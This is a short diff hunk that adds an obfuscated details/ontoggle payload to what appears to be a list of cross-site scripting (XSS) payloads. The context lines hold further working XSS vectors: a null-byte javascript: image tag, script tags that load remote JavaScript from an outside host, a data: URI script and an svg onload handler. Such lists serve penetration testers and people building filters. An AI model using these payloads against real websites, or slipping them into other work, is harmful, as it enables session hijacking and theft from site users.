@@ -50,3 +50,4 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 "><script src=//brutelogic.com.br&sol;1.js&num; 
 "><script src=data:&comma;alert(1)//
 "><svg onload=alert(1)//
+`<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a()%20x>`
